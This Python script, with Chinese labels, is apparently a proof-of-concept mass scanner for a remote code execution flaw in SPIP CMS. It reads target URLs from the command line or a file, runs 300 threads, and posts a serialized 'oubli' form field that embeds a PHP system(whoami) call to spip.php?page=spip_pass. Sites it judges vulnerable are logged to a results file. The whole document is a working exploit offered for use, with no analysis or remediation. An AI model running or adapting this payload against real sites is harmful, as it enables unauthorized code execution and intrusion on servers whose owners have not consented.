import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text = """SPIP CMS远程代码执行漏洞"""
    print(text)

def main():
    banner()
    parser = argparse.ArgumentParser(description="SPIP CMS远程代码执行漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tuage:python {sys.argv[0]} -h")
def poc(target):
    payload = '/spip.php?page=spip_pass'
    headers = {
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding":"gzip,deflate",
    "Content-Type":"application/x-www-form-urlencoded",
    "Content-Length":"124",
    "Connection":"close",
    "Upgrade-Insecure-Requests":"1",
    }
    data = 'page=spip_pass&formulaire_action=oubli&formulaire_action_args=CSRF_TOKEN&oubli=s:19:"<?php system(whoami); ?>";&nobot='
    try:
        res = requests.get(url=target,verify=False,timeout=5)
        if res.status_code == 200:
            res2 = requests.post(url=target+payload,headers=headers,data=data,timeout=5, verify=False)
            if res2.status_code == 200 and '<!DOCTYPE html>' in res2.text:
                print(f'[+]该{target}存在远程代码执行漏洞')
                with open('SPIP_result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-]该{target}不存在远程代码执行漏洞')
                return False
    except Exception as e:
        print(f'{target}可能存在远程代码执行漏洞请手工测试')
if __name__ == '__main__':
    main()